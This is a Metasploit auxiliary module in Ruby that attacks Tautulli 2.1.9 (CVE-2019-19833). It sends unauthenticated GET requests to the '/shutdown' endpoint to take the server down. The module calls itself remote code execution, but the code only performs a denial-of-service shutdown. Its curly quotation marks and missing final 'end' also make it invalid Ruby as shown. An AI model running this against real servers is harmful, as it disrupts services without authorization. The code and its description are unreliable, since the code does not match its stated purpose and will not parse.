##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#
##


class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient

   def initialize
       super(
           ‘Name’        => ‘Tautulli 2.1.9 - Unauthenticated Remote Code Execution’,
           ‘Description’ => ‘Unauthenticated Remote Code Execution at Tautulli 2.1.9 by malicious GET requests’,
           ‘Author’      => ‘Ismail Tasdelen’,
           ‘License’     => MSF_LICENSE,
           ‘References’     =>
           [
              ['CVE', '2019-19833' ],
              ['EDB', '47785'],
              ['URL', 'https://www.exploit-db.com/exploits/47785']
           ]
       )
       register_options(
           [
               Opt::RPORT(8181) # Default Port : 8181
           ], self.class
       )
   end

   def run
       urllist=[
           ‘/shutdown’] # Tautulli 2.1.9 Server Shutdown Attack Parameter

       urllist.each do |url|
           begin
               res = send_request_raw(
               {
                       ‘method’=> ‘GET’,
                       ‘uri’=> url
               })

               if res
                   print_good(“Shutdown! for #{url}”)
               else
                   print_status(“Shutdown(no response) detected for #{url}”)
               end
           rescue Errno::ECONNRESET
               print_status(“Shutdown(rst) detected for #{url}”)
           rescue Exception
               print_error(“Connection failed.”)
           end
       end
   end
